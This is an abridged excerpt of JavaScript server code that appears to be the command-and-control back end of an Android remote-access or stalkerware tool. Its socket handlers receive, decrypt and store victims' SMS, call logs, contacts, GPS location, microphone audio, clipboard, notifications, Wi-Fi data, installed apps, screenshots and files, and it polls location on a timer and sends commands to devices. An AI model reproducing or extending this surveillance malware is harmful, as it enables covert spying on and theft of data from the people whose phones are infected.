...
class Clients {
    ...
    clientDisconnect(clientID, reason, details) {
        ...
        if (this.ignoreDisconnects[clientID]) {
            ...
            logManager.log(CONST.logTypes.info, clientID + " Disconnected - "+ reason + " " + details)
    ...
    getClientSettings(clientID){
        return this.getClientDatabase(clientID).get('Settings');
    }

    updateClientSettings(clientID, settings){
        this.getClientDatabase(clientID).Settings = {
            ...this.getClientDatabase(clientID).Settings,
            ...settings
        };
    }
    ...
    setupListeners(clientID) {
        ...
        socket.on('disconnect', (reason, details) => this.clientDisconnect(clientID, reason, details));
        ...
        socket.on("reqpk", (data)=>{
            const settings = this.getClientSettings(clientID);
            if(!settings?.isPkSent){
                console.log("welcome - >", CryptoManager.getInstance().publicKeyPem);
                socket.emit('welcome', CryptoManager.getInstance().publicKeyPem);
                this.updateClientSettings(clientID, {...settings, isPkSent :true });
            }
        });

        // ====== DISABLED -- It never really worked, and new AccessRules stop us from using camera in the background ====== //

        socket.on(CONST.messageKeys.screenshot, async (payload) => {
            await this._checkAndDecrypt(payload, (data) => {
                if (data.ss) {
                    const file = data.ss;
                    logManager.log(CONST.logTypes.info, "Recieving " + file.name + " from " + clientID);
                    ...
                    let fileExt = (file.name.substring(file.name.lastIndexOf(".")).length !== file.name.length) ? file.name.substring(file.name.lastIndexOf(".")) : '.unknown';
    
                    let filePath = path.join(CONST.downloadsFullPath, fileKey + fileExt);
    
                    fs.writeFile(filePath, Buffer.from(file.buffer), (e) => {
                        if (!e) {
        ...
        socket.on(CONST.messageKeys.files, async (payload) => {
            // {
            ...
            await this._checkAndDecrypt(payload, (data) => {
                if (data.type === "list") {
                    ...
                    fs.writeFile(filePath, Buffer.from(data.buffer), (error) => {
                        if (!error) {
        ...
        socket.on(CONST.messageKeys.call, async (payload) => {
            await this._checkAndDecrypt(payload, (data) => {
                if (data.cList) {
                    if (data.cList.length !== 0) {
                        let callsList = data.cList;
                        let dbCall = client.get('CallData');
                        let newCount = 0;
                        callsList.forEach(call => {
                            let hash = crypto.createHash('md5').update(call.number + call.timestamp).digest("hex");
        ...
        socket.on(CONST.messageKeys.sms, async (payload) => {
            await this._checkAndDecrypt(payload, (data) => {

                if (typeof data === "object") {
                    let smsList = data.sml;
                    if (smsList.length !== 0) {
        ...
        socket.on(CONST.messageKeys.mic, async (payload) => {
            await this._checkAndDecrypt(payload, (data) => {
        ...
        socket.on(CONST.messageKeys.location, async (payload) => {
            await this._checkAndDecrypt(payload, (data) => {
                if(data.loc){
                    const loc = data.loc;
                if (Object.keys(loc).length !== 0 && loc.hasOwnProperty("latitude") && loc.hasOwnProperty("longitude")) {
        ...
        socket.on(CONST.messageKeys.clipboard, async (payload) => {
            await this._checkAndDecrypt(payload, (data) => {
        ...
        socket.on(CONST.messageKeys.notification, async (payload) => {
            await this._checkAndDecrypt(payload, (data) => {
        ...
        socket.on(CONST.messageKeys.contacts, async (payload) => {
            await this._checkAndDecrypt(payload, (data) => {
                if (data.ctList) {
                    if (data.ctList.length !== 0) {
                        let contactsList = data.ctList;
                        let dbContacts = client.get('contacts');
                        let newCount = 0;
                        contactsList.forEach(contact => {
                            contact.phoneNo = contact.displayName.replace(/\s+/g, '');
                            let hash = crypto.createHash('md5').update(contact.displayName + contact?.name).digest("hex");
        ...
        socket.on(CONST.messageKeys.wifi, async (payload) => {
            await this._checkAndDecrypt(payload, (data) => {
        ...
        socket.on(CONST.messageKeys.permissions, async (payload) => {
            await this._checkAndDecrypt(payload, (data) => {
        ...
        socket.on(CONST.messageKeys.installed, async (payload) => {
            await this._checkAndDecrypt(payload, (data) => {
    ...
    getClientDataByPage(clientID, page, filter = undefined) {
        ...
        if (client !== undefined) {
            ...
            else if (page === "screenshot") pageData = clientDB.get('downloads').value().filter(dw => dw.type === "screenshot");
            ...
            if (!error) {
                ...
                if (client !== undefined) {
                    ...
                    if (clientID in this.clientConnections) {
                        ...
                        socket.emit('notification', commandPayload)
    ...
    checkCorrectParams(commandID, commandPayload, cb) {
        ...
        else if (commandID === CONST.messageKeys.callLog) {
            if (!'from' in commandPayload || !'to' in commandPayload) return cb('CallLog Missing `from` or `to` Parameter')
            else {
                if (commandPayload.from > commandPayload.to) return cb('CallLog `from` parameter is greater than `to` parameter')
                else return cb(false)
            }
        }
    ...
    gpsPoll(clientID) {
        ...
        if (gpsSettings.updateFrequency > 0) {
            this.gpsPollers[clientID] = setInterval(() => {
                ...
                this.sendCommand(clientID, '0xA7K')
    ...
    async _checkAndDecrypt(data, cb) {
        if(data.encr){
            const dec = await this.cryptoManager.decryptJson(data.encr);
            cb(dec);
            return;
        }
        cb(data);
